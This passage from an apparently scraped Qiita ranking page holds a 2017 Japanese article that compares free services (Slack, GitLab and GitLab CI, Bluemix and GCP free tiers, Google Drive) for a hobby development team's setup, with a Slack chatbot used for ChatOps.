<span id="結論めっちゃ簡単だったので使ってみてください" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96%E3%82%81%E3%81%A3%E3%81%A1%E3%82%83%E7%B0%A1%E5%8D%98%E3%81%A0%E3%81%A3%E3%81%9F%E3%81%AE%E3%81%A7%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%A6%E3%81%8F%E3%81%A0%E3%81%95%E3%81%84"><i class="fa fa-link"></i></a>結論：めっちゃ簡単だったので使ってみてください</h3>

<p><a href="https://www.netlify.com/" class="autolink" rel="nofollow noopener" target="_blank">https://www.netlify.com/</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">33位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>291</kbd>
		<a target="_blank" href="https://qiita.com/t_nakayama0714/items/c0eb5e298524c127bccd">無料で整える趣味チームの開発環境</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-19<br />14:05:08</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/45253.html">t_nakayama0714</a>(32件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/45253/profile-images/1473690211">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[開発環境]</b> <b>[ChatOps]</b> <b>[チーム]</b> <b>[無料]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="趣味チーム" class="fragment"></span><a href="#%E8%B6%A3%E5%91%B3%E3%83%81%E3%83%BC%E3%83%A0"><i class="fa fa-link"></i></a><strong>趣味チーム？</strong>
</h1>

<p>趣味チームに所属している方はいらっしゃるでしょうか。<br>
お仕事関係なしに友人たちと趣味で開発するような人たちです。<br>
趣味と言えどもチームですから、チームで使える開発環境を整えたくなります。</p>

<p>「 <strong>趣味チームの開発環境を整えたい</strong> 」</p>

<p>そう思った時に課題になるのが <strong>お金</strong> です。<br>
もちろん投資だと思ってお金を出せればいいのですが、基本線は趣味ですから中々そうもいきません。<br>
ここはひとつ趣味の一環として、 <strong>無料縛り</strong> という制約を貸した上で、趣味チームの開発環境をどこまで整えられるのかを考えてみたいと思います。</p>

<h2>
<span id="環境イメージ" class="fragment"></span><a href="#%E7%92%B0%E5%A2%83%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>環境イメージ</h2>

<p>先にネタばらしをしておくと、以下のような感じに落ち着きました。利用量の制限はありますが <strong>無料</strong> です。</p>

<p><em><a href="https://camo.qiitausercontent.com/684e113d5c0aa3dfcbe6f84262fba7e73abf6e36/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f63663961626534362d393265392d646539382d346134392d6330316236663464396533362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/684e113d5c0aa3dfcbe6f84262fba7e73abf6e36/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f63663961626534362d393265392d646539382d346134392d6330316236663464396533362e706e67" width="800" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/cf9abe46-92e9-de98-4a49-c01b6f4d9e36.png"></a><br>
<div>Icons made by <a href="https://www.flaticon.com/authors/prosymbols" title="Prosymbols" rel="nofollow noopener" target="_blank">Prosymbols</a> from <a href="https://www.flaticon.com/" title="Flaticon" rel="nofollow noopener" target="_blank"></a><a href="http://www.flaticon.com" rel="nofollow noopener" target="_blank">www.flaticon.com</a> is licensed by <a href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons BY 3.0" rel="nofollow noopener" target="_blank">CC 3.0 BY</a>
</div></em></p>

<p>簡単に言うと以下のようなことができます。</p>

<ul>
<li>メンバ数 <strong>制限なし</strong>
</li>
<li>
<strong>プライベートリポジトリ</strong> 作成可</li>
<li>任意のデバイスからのチャット(～1万メッセージ)、ファイル共有(～15GB)</li>
<li>
<strong>毎月2000分</strong> までのCI</li>
<li><strong>24時間稼働のChatbot</strong></li>
<li>
<strong>24時間稼働のVM</strong> (1vCPU, 0.6GB) × 1</li>
</ul>

<h3>
<span id="chatops" class="fragment"></span><a href="#chatops"><i class="fa fa-link"></i></a>ChatOps</h3>

<p>イメージ図から大体想像つくかと思いますが、Blumix上のHubotでSlackからChatOps的なこともやってます。</p>

<ul>
<li>VMの <strong>起動 / 停止</strong>
</li>
<li>
<strong>定期ジョブの実行</strong>

<ul>
<li>起動中VMの通知</li>
<li>課金額の通知</li>
</ul>
</li>
<li>VMでのコマンド実行</li>
</ul>

<p>地味にありがたいのは「 <strong>起動中VMの通知</strong> 」「 <strong>VMの停止</strong> 」あたりですかね。<br>
無料枠だけではどうしてもリソースが足りないときは当然有料のVMを借りるんですが、なんとなく止め忘れちゃったりすることもあるので、 <strong>気づくことと停止がSlackだけでサクッとできる</strong> のは非常に重宝します。</p>

<p>あとは「課金額の通知」なんかも <strong>無料縛り</strong> の実現のためには重要なbot機能でしょうか。</p>

<h2>
<span id="サービスカテゴリ" class="fragment"></span><a href="#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA"><i class="fa fa-link"></i></a>サービスカテゴリ</h2>

<p>今回は下記のカテゴリについて、全体的なバランスをみながら考えました。</p>

<ul>
<li><strong>Chat</strong></li>
<li><strong>Git Repository</strong></li>
<li><strong>CI</strong></li>
<li><strong>Infra/App Platform</strong></li>
<li><strong>Filestorage</strong></li>
<li><strong>その他</strong></li>
</ul>

<p>それぞれの中には「なんとなく決めた」ものも当然入っていますので、厳密な評価でないことはご容赦ください。<br>
各カテゴリについて、</p>

<ul>
<li>
<strong>Point</strong>

<ul>
<li>サービスを選定する上で外せなかったポイント。いわゆる要件。</li>
</ul>
</li>
<li>
<strong>Pros</strong>

<ul>
<li>そのサービスのよいところ、イケてるところ。</li>
</ul>
</li>
<li>
<strong>Cons</strong>

<ul>
<li>そのサービスのわるいところ、イマイチなところ。</li>
</ul>
</li>
</ul>

<p>の観点で簡単に評価していきたいと思います。</p>

<h1>
<span id="chat" class="fragment"></span><a href="#chat"><i class="fa fa-link"></i></a><strong>Chat</strong>
</h1>

<p>まずはコミュニケーションの要、チャットツールを考えましょう。</p>

<ul>
<li><strong><a href="https://slack.com/" rel="nofollow noopener" target="_blank">Slack</a></strong></li>
<li><a href="https://gitter.im/" rel="nofollow noopener" target="_blank">Gitter</a></li>
<li><a href="https://ja.atlassian.com/software/hipchat" rel="nofollow noopener" target="_blank">HipChat</a></li>
<li><a href="http://www.chatwork.com/ja/" rel="nofollow noopener" target="_blank">ChatWork</a></li>
<li><a href="https://line.me/ja/" rel="nofollow noopener" target="_blank">LINE</a></li>
<li><a href="https://www.skype.com/ja/" rel="nofollow noopener" target="_blank">Skype</a></li>
</ul>

<p>無料で使えるものだけでも結構な数があります。  </p>

<h2>
<span id="point" class="fragment"></span><a href="#point"><i class="fa fa-link"></i></a>Point</h2>

<p>基本的にはPCに向かって開発をやるわけではありますが、コミュニケーション自体は色々なところでやりますので、 <strong>マルチデバイス対応</strong> が重要です。<br>
PC版(Windows/Mac/Linux)、モバイル版(Android/iOS)への対応が必須です。<br>
また、色んなことをして遊びたいので <strong>bot連携</strong> 、 <strong>外部サービス連携</strong> のしやすさも重視したポイントです。</p>

<p>以上を踏まえ、チャットサービスには <strong>Slack</strong> を選択しました。</p>

<h2>
<span id="slack" class="fragment"></span><a href="#slack"><i class="fa fa-link"></i></a><strong>Slack</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/b18345f7c5b5c45746a70632162594197b39b21a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f31623739616638362d366461392d316234612d393963372d3734366237613135663634632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b18345f7c5b5c45746a70632162594197b39b21a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f31623739616638362d366461392d316234612d393963372d3734366237613135663634632e706e67" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/1b79af86-6da9-1b4a-99c7-746b7a15f64c.png"></a></p>

<h3>
<span id="pros" class="fragment"></span><a href="#pros"><i class="fa fa-link"></i></a>Pros</h3>

<ul>
<li>マルチデバイス対応</li>
<li>豊富な外部連携</li>
</ul>

<p>何と言っても外部連携に寛容でIT技術者向けなところが最大の長所といえます。</p>

<p>他サービスに比べれば標準で持っている機能に乏しい面があったりしますが、ターゲットがIT技術者であるがゆえにAPIやら何やらで利用者自身がその不足を補えるようになっています。 <strong>楽しい</strong> 。<br>
IT界隈でのチャットサービスとしてはデファクトスタンダードとなっているので、情報量豊富なのも遊ぶアイデアに困ることなく嬉しいポイントです。</p>

<h3>
<span id="cons" class="fragment"></span><a href="#cons"><i class="fa fa-link"></i></a>Cons</h3>

<p>今回の例で言えば特段気になる点はなかったのですが、一般的な比較においてはタスク管理などのチャット以外の機能について言及されることが多いようですね。<br>
また、「アカウントを持たない社外メンバとも気軽にやりとりしたい」というケースにも対応できないため、コミュニティクローズドな部分が場合によっては短所になるようです。<sup id="fnref1"><a href="#fn1" rel="footnote" title="Shared Channelという機能が今後登場するようなので、この部分は短所としては弱くなっていくかもしれません。">1</a></sup></p>

<ul>
<li><a href="https://boxil.jp/mag/a110/" rel="nofollow noopener" target="_blank">チャットワークとSlackどちらを採用すべき？2大チャットツールを徹底比較！</a></li>
</ul>

<h1>
<span id="git-repository" class="fragment"></span><a href="#git-repository"><i class="fa fa-link"></i></a><strong>Git Repository</strong>
</h1>

<p>おそらく何かしらを開発することになると思うので、成果物を共有するための場所が必要です。<br>
ソースコードといえばバージョン管理システムが必須になるでしょうから、Gitのサービスを選んでみます。</p>

<ul>
<li><strong><a href="https://gitlab.com" rel="nofollow noopener" target="_blank">GitLab</a></strong></li>
<li><a href="https://github.com" rel="nofollow noopener" target="_blank">GitHub</a></li>
<li><a href="https://bitbucket.org" rel="nofollow noopener" target="_blank">BitBucket</a></li>
</ul>

<h2>
<span id="point-1" class="fragment"></span><a href="#point-1"><i class="fa fa-link"></i></a>Point</h2>

<p>作るものにもよりけりですが、今回はチームで内々に作っていきたいものだったため、 <strong>プライベートリポジトリ</strong> が要件としてありました。<br>
この点では業界のデファクトスタンダードである GitHub は少し弱いため、他の機能の豊富さと相まって <strong>GitLab</strong> を選ぶに至りました。</p>

<h2>
<span id="gitlab" class="fragment"></span><a href="#gitlab"><i class="fa fa-link"></i></a><strong>GitLab</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/99d740e89de0ecb9b50f2b9d6b5dddd810009277/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f35633962343035612d326233342d333865342d346137652d3364386664313262373535662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/99d740e89de0ecb9b50f2b9d6b5dddd810009277/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f35633962343035612d326233342d333865342d346137652d3364386664313262373535662e706e67" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/5c9b405a-2b34-38e4-4a7e-3d8fd12b755f.png"></a></p>

<h3>
<span id="pros-1" class="fragment"></span><a href="#pros-1"><i class="fa fa-link"></i></a>Pros</h3>

<p>ポイントでも述べた通り、 <strong>プライベートリポジトリが無料</strong> で使えるのが魅力です。<br>
プライベートリポジトリという点ではBitBucketも無料で使えるのですが、無料のプライベートリポジトリは <strong>所属ユーザが5名まで</strong> という制限があります。<br>
その他、GitLabは競合するサービスと同等の各種機能を備え、後述する <strong>CI機能</strong> すら備わっています。</p>

<h3>
<span id="cons-1" class="fragment"></span><a href="#cons-1"><i class="fa fa-link"></i></a>Cons</h3>

<p>仮にチームの成果物をクローズドではなくオープンに見せたい場合は <strong>圧倒的にGitHubが優位</strong> になると言えます。<br>
ここに至っては機能よりサービスとしての <strong>知名度</strong> がモノを言いますので、GitLab最大の弱点と言えるでしょう。<br>
また、個人的には好きですがGitLabはガンガン最新版へのアップデートをかけていくため、気づいたらUIがずいぶん変わっていたなんとことも起こったりします。</p>

<p>あとはチームの大きさにもよりますが、「1 Issue, 1 Asignee」ってのも場合によっては問題になるかもしれません。</p>

<h1>
<span id="ci" class="fragment"></span><a href="#ci"><i class="fa fa-link"></i></a><strong>CI</strong>
</h1>

<p>さて、ソースコードの管理に続いてCI機能もほしいところです。<br>
リポジトリへのpushに反応してビルドなどを自動で行ってくれるCIサービスは一度使い始めるとやめられない魅力があります。</p>

<ul>
<li><strong><a href="https://about.gitlab.com/features/gitlab-ci-cd/" rel="nofollow noopener" target="_blank">GitLab CI</a></strong></li>
<li><a href="https://circleci.com/" rel="nofollow noopener" target="_blank">Circle CI</a></li>
<li><a href="https://travis-ci.org/" rel="nofollow noopener" target="_blank">Travis CI</a></li>
<li><a href="https://concourse.ci/" rel="nofollow noopener" target="_blank">Concourse CI</a></li>
<li><a href="https://www.appveyor.com/" rel="nofollow noopener" target="_blank">Appveyor</a></li>
<li><a href="https://semaphoreci.com/" rel="nofollow noopener" target="_blank">Semaphore</a></li>
</ul>

<h2>
<span id="point-2" class="fragment"></span><a href="#point-2"><i class="fa fa-link"></i></a>Point</h2>

<p>基本的にはソースコードと密接に関連があるもののため、Gitサービスとの連携性が重要なポイントになります。<br>
とはいえ、基本的なところは「Git連携機能」として各サービス共通ですし、サービス固有ということであればGitHubとそれ以外っていうくくりになります。<br>
今回はGitリポジトリにGitLabを選んでいるため、連携性での優位性はGitLab CIを含めて特段関係がないと思われます。</p>

<ul>
<li><a href="http://srz-zumix.blogspot.jp/2016/01/ci.html" rel="nofollow noopener" target="_blank">無料で使える CI サービス比較</a></li>
</ul>

<p>あとは上記ページでもまとめられていますが、 <strong>ビルド時間の制限</strong> はサービスごとにちょっとばらつきがあるようです。<br>
選定時点で特にこだわりはなかったのでGitリポジトリとの親和性をイメージして <strong>GitLab CI</strong> を選択しています。</p>

<h2>
<span id="gitlab-ci" class="fragment"></span><a href="#gitlab-ci"><i class="fa fa-link"></i></a><strong>GitLab CI</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/99d740e89de0ecb9b50f2b9d6b5dddd810009277/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f35633962343035612d326233342d333865342d346137652d3364386664313262373535662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/99d740e89de0ecb9b50f2b9d6b5dddd810009277/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f35633962343035612d326233342d333865342d346137652d3364386664313262373535662e706e67" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/5c9b405a-2b34-38e4-4a7e-3d8fd12b755f.png"></a></p>

<h3>
<span id="pros-2" class="fragment"></span><a href="#pros-2"><i class="fa fa-link"></i></a>Pros</h3>

<p>GitLabとの連携という点では印象的には優れている感があります。<br>
SlackインテグレーションなんかでもGitLab連携ひとつで済むので、趣味チームとして利用サービスが少ないのはそこそこ嬉しくはあります。</p>

<p>また、今回悩まなかったのですが、この記事のため調べていて「 <strong>プライベートリポジトリに対するCI</strong> 」って意外とできないところが多いんだなと感じました。もちろんGitLabとGitLab CIの組み合わせなら気にする必要はありません。</p>

<h3>
<span id="cons-2" class="fragment"></span><a href="#cons-2"><i class="fa fa-link"></i></a>Cons</h3>

<p>機能的なところでいくと、GitLab CIは「時間トリガー」で処理を実行することができません。<br>
時間トリガーってところであれば、 <strong>Appveyor</strong> とか <strong>Semaphore</strong> あたりを使うことになると思います。</p>

<ul>
<li><a href="http://srz-zumix.blogspot.jp/2016/10/ci.html" rel="nofollow noopener" target="_blank">無料で使える CI サービス比較（定期実行編）</a></li>
</ul>

<p>ちなみに今回は時間トリガー処理はCIサービスに頼らずbotで動く <a href="https://www.npmjs.com/package/cron" rel="nofollow noopener" target="_blank">cron</a> 機能に任せています。</p>

<h1>
<span id="infraapp-platform" class="fragment"></span><a href="#infraapp-platform"><i class="fa fa-link"></i></a><strong>Infra/App Platform</strong>
</h1>

<p>チームで成果物を作ったら、おそらくどこかで動したくなるものでしょう。<br>
そういった場合にいわゆるIaaSやPaaSといったサービスを利用したくなります。</p>

<ul>
<li>
<strong><a href="https://www.ibm.com/cloud-computing/bluemix/" rel="nofollow noopener" target="_blank">Bluemix</a></strong>

<ul>
<li><a href="https://www.ibm.com/cloud-computing/bluemix/ja/pricing" rel="nofollow noopener" target="_blank">Bluemix Pricing</a></li>
</ul>
</li>
<li>
<strong><a href="https://cloud.google.com/?hl=ja" rel="nofollow noopener" target="_blank">GCP</a></strong>

<ul>
<li><a href="https://cloud.google.com/free/?hl=ja" rel="nofollow noopener" target="_blank">Google Cloud Platform Free Tier</a></li>
</ul>
</li>
<li>
<a href="https://www.heroku.com/home" rel="nofollow noopener" target="_blank">Heroku</a>

<ul>
<li><a href="https://www.heroku.com/pricing" rel="nofollow noopener" target="_blank">Simple, flexible pricing</a></li>
</ul>
</li>
<li>
<a href="https://aws.amazon.com/jp/" rel="nofollow noopener" target="_blank">AWS</a>

<ul>
<li><a href="https://aws.amazon.com/jp/free/" rel="nofollow noopener" target="_blank">AWS Free Tier</a></li>
</ul>
</li>
<li>
<a href="https://azure.microsoft.com/ja-jp/" rel="nofollow noopener" target="_blank">Azure</a>

<ul>
<li><a href="https://azure.microsoft.com/ja-jp/free/pricing-offers/" rel="nofollow noopener" target="_blank">free pricing offers</a></li>
</ul>
</li>
</ul>

<h2>
<span id="point-3" class="fragment"></span><a href="#point-3"><i class="fa fa-link"></i></a>Point</h2>

<p>ここに並んだサービスのシェアだけで言えば圧倒的に <strong>AWS</strong> なのですが、意外とAWSの無料枠はしょっぱかったりするのでお金のない趣味チームには向きません。<br>
そこで出てくるのが <strong>Bluemix</strong> と <strong>GCP</strong> です。<br>
サービスが多岐にわたることからぱっと理解するのが難しいのですが <strong><a href="https://www.ibm.com/cloud-computing/bluemix/ja/pricing" rel="nofollow noopener" target="_blank">Bluemix Pricing</a></strong> や <strong><a href="https://cloud.google.com/free/?hl=ja" rel="nofollow noopener" target="_blank">Google Cloud Platform Free Tier</a></strong> を見ると、結構色々なものに無料枠が備わっていることがわかります。<br>
今回特に注目したのが、「仮想マシン」「アプリエンジン」でした。</p>

<h2>
<span id="bluemix--gcp" class="fragment"></span><a href="#bluemix--gcp"><i class="fa fa-link"></i></a><strong>Bluemix &amp; GCP</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/37b5e121fbe5d8a0caabf99c890ccbc8abd6d7ae/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f33333530303132302d376236322d323932302d393566362d3637303233366334636664642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/37b5e121fbe5d8a0caabf99c890ccbc8abd6d7ae/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f33333530303132302d376236322d323932302d393566362d3637303233366334636664642e706e67" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/33500120-7b62-2920-95f6-670236c4cfdd.png"></a><a href="https://camo.qiitausercontent.com/565fb00f000c661d7da5c75673aaf73fef06ee5b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f35333966306266632d313963382d653032662d393661362d3163373036396262353262622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/565fb00f000c661d7da5c75673aaf73fef06ee5b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f35333966306266632d313963382d653032662d393661362d3163373036396262353262622e706e67" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/539f0bfc-19c8-e02f-96a6-1c7069bb52bb.png"></a></p>

<h3>
<span id="pros-3" class="fragment"></span><a href="#pros-3"><i class="fa fa-link"></i></a>Pros</h3>

<ul>
<li>
<strong>仮想マシン</strong>

<ul>
<li>
<a href="https://cloud.google.com/compute/?hl=ja" rel="nofollow noopener" target="_blank">GCP: Google Compute Engine</a>

<ul>
<li>1ヶ月あたりf1-micro(1vCPU, 0.60GB)相当分が無料</li>
<li>米国リージョンのみ</li>
<li>ネットワークトラフィックの課金に注意

<ul>
<li><a href="http://qiita.com/hnw/items/a4e395d047b382e7dc5f" id="reference-2a953805342f8673fc65">GCEのf1-microインスタンスを真にタダで使う方法</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<strong>アプリエンジン</strong>

<ul>
<li>
<a href="https://www.ibm.com/cloud-computing/bluemix/runtimes" rel="nofollow noopener" target="_blank">Bluemix: Bluemix Cloud Foundry app runtimes</a>

<ul>
<li>1ヶ月あたり512MB・月が無料</li>
<li><a href="http://qiita.com/akameco/items/39a55635ceb0ba185b7f" id="reference-697e5aa6998acd23ede2">参考: Herokuでbotを運用する時代は終わった。これからはIBM Bluemixを使って無料で運用する</a></li>
</ul>
</li>
<li>
<a href="https://cloud.google.com/appengine/?hl=ja" rel="nofollow noopener" target="_blank">GCP: Google App Engine</a>

<ul>
<li>1日あたり28時間・インスタンスが無料</li>
</ul>
</li>
</ul>
</li>
</ul>

<p>参考にもあるように、Bluemixを使ってbotを24時間運用しています。簡単な処理をこいつにさせることも出来るので意外と重宝しています。<br>
ちなみに少し前まではBluemixでdashDBというRDBがデータ量1GBまで無料だったのですが、いつの間にかなくなっていました。残念です。<br>
dashDBの無料枠がなくなってしまった今では <a href="https://www.ibm.com/analytics/jp/ja/technology/cloud-data-services/cloudant/" rel="nofollow noopener" target="_blank">IBM Cloudant</a> というNoSQLが1ヶ月あたり1GB分無料となっています。</p>

<h3>
<span id="cons-3" class="fragment"></span><a href="#cons-3"><i class="fa fa-link"></i></a>Cons</h3>

<p>無料枠が強気なところがまさにそのためだと思うのですが、BluemixとGCPはAWSやAzureに比べて情報が少ないです。<br>
実際には、AWSに関する情報量とAzureを含めたその他全ての情報量を比べてもまだAWSに勝てないというような構図だと思いますが、無料でがんばろうとするのであれば、こうした情報収集で音を上げるわけにはいかないところです。</p>

<p>Bluemixは元々SoftLayerっていうIaaSとBluemixっていうPaasに分かれていたこともあり、サービスとしての全体像が掴みにくいのですが、IBMならではのWatsonサービスを使って <a href="http://qiita.com/tsota/items/497513585f069386626f" id="reference-25903567adb81490ca41">会話エンジンにWatson Conversationを使ったSlack botを作ってみた</a> みたいなことができたりもします。</p>

<p>一方GCPはどうかというと、 <strong><a href="https://cloud.google.com/bigquery/?hl=ja" rel="nofollow noopener" target="_blank">BigQuery</a></strong> が1ヶ月あたり1TBスキャンまで無料だたり、画像認識の <strong><a href="https://cloud.google.com/vision/?hl=ja" rel="nofollow noopener" target="_blank">Google Cloud Vision API</a></strong> が1ヶ月あたり1000ユニットまで無料で使えたりします。</p>

<h3>
<span id="注意" class="fragment"></span><a href="#%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a>注意</h3>

<p>ただし、これらの無料枠を使用するためにはアカウントに対して <strong>クレジットカードの紐付け</strong> が必要になります。<br>
無料枠を超えた分は自動的に課金されることになるため、各サービスの課金体系を理解し、使用量を正しくモニタリングできない場合は安易に手を出さないほうがよいでしょう。戒めのため以下の記事を紹介します。</p>

<ul>
<li><a href="http://qiita.com/itkr/items/745d54c781badc148bb9" id="reference-2657d944d1a4c6562a07">BigQueryで150万円溶かした人の顔</a></li>
<li><a href="http://blog.hde.co.jp/entry/2015/01/30/154101" rel="nofollow noopener" target="_blank">Amazon Glacierでクラウド破産しないために</a></li>
</ul>

<p>また、ありがちな話ですが各種リソースをコントロール可能な <strong>APIキーの公開は絶対にやめましょう &amp; 注意しましょう</strong> 。</p>

<ul>
<li><a href="http://qiita.com/mochizukikotaro/items/a0e98ff0063a77e7b694" id="reference-dbe4e7065208cbc4ac1b">初心者がAWSでミスって不正利用されて$6,000請求、泣きそうになったお話。</a></li>
<li><a href="http://qiita.com/pottava/items/4c602c97aacf10c058f1" id="reference-97f754c0ad1b7aba4a81">クラウド破産しないように git-secrets を使う</a></li>
</ul>

<h1>
<span id="filestorage" class="fragment"></span><a href="#filestorage"><i class="fa fa-link"></i></a><strong>Filestorage</strong>
</h1>

<p>ソースコードはGitで管理、共有すればいいのですが、バイナリファイルをGitに置くのは心が痛みます。<br>
そのため、ファイルストレージサービスを探しましょう。</p>

<ul>
<li><strong><a href="https://www.google.com/intl/ja_jp/drive/" rel="nofollow noopener" target="_blank">Google Drive</a></strong></li>
<li><a href="https://www.dropbox.com" rel="nofollow noopener" target="_blank">Dropbox</a></li>
<li><a href="https://www.box.com/ja-jp" rel="nofollow noopener" target="_blank">BOX</a></li>
<li><a href="https://mega.co.nz/" rel="nofollow noopener" target="_blank">MEGA</a></li>
<li><a href="http://www.chatwork.com/ja/" rel="nofollow noopener" target="_blank">ChatWork</a></li>
</ul>

<h2>
<span id="point-4" class="fragment"></span><a href="#point-4"><i class="fa fa-link"></i></a>Point</h2>

<p>基本的にはバイナリファイルの受け渡し場所として機能すればよいため、正直なところあまりポイントはありません。<br>
データをまるっと渡したりすることがあるかもと考えると、最低でも10GBくらいはあると安心かもしれません。</p>

<ul>
<li><a href="https://ferret-plus.com/2377" rel="nofollow noopener" target="_blank">【比較表有】容量だけで選んでいいの？無料オンラインファイルストレージ17選</a></li>
</ul>

<p>また、すでにチャットカテゴリでも登場している ChatWork ですが、チーム機能の一環でファイルストレージ機能ももっています。<br>
利用サービスを極力少なくしたいということであれば、 ChatWork に寄せてしまうのもアリでしょう。</p>

<h2>
<span id="google-drive" class="fragment"></span><a href="#google-drive"><i class="fa fa-link"></i></a><strong>Google Drive</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/f075cd0030ca5f3aefbcd24fb138a13b2b4e37c1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f34353235613231632d376562382d333935342d623163372d3439316433616164653837312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f075cd0030ca5f3aefbcd24fb138a13b2b4e37c1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34353235332f34353235613231632d376562382d333935342d623163372d3439316433616164653837312e706e67" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/45253/4525a21c-7eb8-3954-b1c7-491d3aade871.png"></a></p>

<h3>
<span id="pros-4" class="fragment"></span><a href="#pros-4"><i class="fa fa-link"></i></a>Pros</h3>

<p>15GBと比較的容量が多いことと、 <strong><a href="https://get.slack.help/hc/ja/articles/205875058-Slack-%E3%81%A7-Google-%E3%83%89%E3%83%A9%E3%82%A4%E3%83%96%E3%82%92%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B" rel="nofollow noopener" target="_blank">Slackとの親和性</a></strong> が高いところでしょうか。<br>
Excelみたいなものを共有する場合、Googleスプレッドシートなどでブラウザ上でそのまま開けるのも便利です。</p>

<p>あとは多分チームのみんなGoogleアカウントは持っているでしょうから、アカウント増やさなくて済むのも割と大きな魅力です。</p>

<h3>
<span id="cons-4" class="fragment"></span><a href="#cons-4"><i class="fa fa-link"></i></a>Cons</h3>

<p>先に挙げた比較ページを見てわかると思いますが、15GBという容量は比較的多いのですが、トップではありません。<br>
トップのMEGAは無料で50GB使えるらしいので、 <strong>容量重視であればMEGA一択</strong> でしょう。</p>

<p>また、Google Driveの容量15GBというのはアカウントあたりであるため、誰かのアカウントの領域を他メンバに共有するという形態になります。<br>
そのため、個人が元々Googleドライブを利用していた場合、チーム開発用途と個人用途で15GBとなってしまうのも難点の1つと言えるでしょう。</p>

<h1>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a><strong>その他</strong>
</h1>

<p>ここからはオマケです。今のところ使っていませんが、ニーズは感じているため使おうかな―と考えているようなものです。</p>

<h2>
<span id="task-management" class="fragment"></span><a href="#task-management"><i class="fa fa-link"></i></a>Task Management</h2>

<p>GitリポジトリにはIssue機能がありますから、ソースコードに関連するタスクをIssueとして記録しておくことができます。<br>
一方で、ソースコードに直接紐付かない微妙なタスクや全体のナレッジはどこにも残せなかったりするのでチームに紐づくタスクやナレッジの管理ができると便利です。</p>

<ul>
<li><a href="https://www.wrike.com/ja/" rel="nofollow noopener" target="_blank">Wrike</a></li>
<li><a href="https://trello.com/" rel="nofollow noopener" target="_blank">Trello</a></li>
<li><a href="https://asana.com/" rel="nofollow noopener" target="_blank">Asana</a></li>
</ul>

<p>他にも無料プランがあるものはいくつかあるようです。</p>

<h3>
<span id="point-5" class="fragment"></span><a href="#point-5"><i class="fa fa-link"></i></a>Point</h3>

<p>タスク管理ツール自体は結構使ってみないと良し悪しがわからなかったりするので、これといった要件を出すことが難しかったりします。</p>

<ul>
<li><a href="http://mfl.revee.jp/blog/project-management-tool-2015/" rel="nofollow noopener" target="_blank">長く使えるプロジェクト管理ツール厳選レポート2017</a></li>
</ul>

